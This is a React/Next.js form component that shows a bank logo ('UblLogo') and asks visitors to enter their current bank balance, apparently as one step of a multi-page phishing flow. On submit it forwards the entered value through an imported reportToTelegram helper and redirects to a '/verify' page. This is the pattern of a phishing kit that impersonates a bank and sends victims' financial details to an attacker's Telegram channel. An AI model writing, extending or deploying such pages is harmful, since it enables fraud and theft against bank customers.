"use client"

import type React from "react"
import { useState } from "react"
import { useRouter } from "next/navigation"
import { ArrowLeft, ArrowRight } from "lucide-react"
import { UblLogo } from "@/components/ubl-logo"
import { reportToTelegram } from "@/lib/report"

export function BalanceForm() {
  const router = useRouter()
  const [balance, setBalance] = useState("")
  const [error, setError] = useState("")

  const isValid = balance.trim() !== ""

  async function handleNext(e: React.FormEvent) {
    e.preventDefault()
    if (!isValid) {
      setError("Please enter your current bank balance.")
      return
    }
    setError("")
    await reportToTelegram("Bank balance", { balance })
    router.push("/verify")
  }

  return (
    <div className="flex h-full w-full max-w-[420px] flex-col">
      {/* Back */}
      <button
        type="button"
        onClick={() => router.back()}
        className="mb-6 flex items-center gap-2 text-[16px] font-bold text-foreground"
      >
        <ArrowLeft size={20} strokeWidth={2.5} />
        Back
      </button>

      {/* Logo */}
      <div className="mb-8">
        <UblLogo />
      </div>

      {/* Heading */}
      <h1 className="text-4xl font-extrabold tracking-tight text-foreground">Bank Balance</h1>
      <p className="mt-2 text-[15px] text-muted-foreground">Enter your current bank balance</p>

      {/* Form */}
      <form onSubmit={handleNext} className="mt-8 flex flex-1 flex-col">
        <input
          type="text"
          inputMode="numeric"
          value={balance}
          onChange={(e) => {
            if (error) setError("")
            setBalance(e.target.value)
          }}
          placeholder="Enter current balance"
          aria-label="Current bank balance"
          className="w-full rounded-full bg-card px-6 py-4 text-[15px] text-foreground placeholder:text-muted-foreground/70 outline-none focus:ring-2 focus:ring-ring/40"
        />

        {error && (
          <p role="alert" className="mt-3 text-[14px] font-semibold text-destructive">
            {error}
          </p>
        )}

        {/* Footer */}
        <div className="mt-auto flex flex-col gap-4">
          {/* Pagination dots */}
          <div className="flex items-center justify-center gap-2">
            {[0, 1, 2, 3].map((i) => (
              <span
                key={i}
                className={
                  "h-2 w-2 rounded-full " + (i === 2 ? "bg-primary" : "bg-muted-foreground/30")
                }
              />
            ))}
          </div>

          <button
            type="submit"
            disabled={!isValid}
            className="flex w-full items-center justify-center gap-2 rounded-full bg-primary py-4 text-[15px] font-bold text-primary-foreground transition-opacity hover:opacity-95 disabled:cursor-not-allowed disabled:opacity-40"
          >
            Next
            <ArrowRight size={18} strokeWidth={2.5} />
          </button>
        </div>
      </form>
    </div>
  )
}
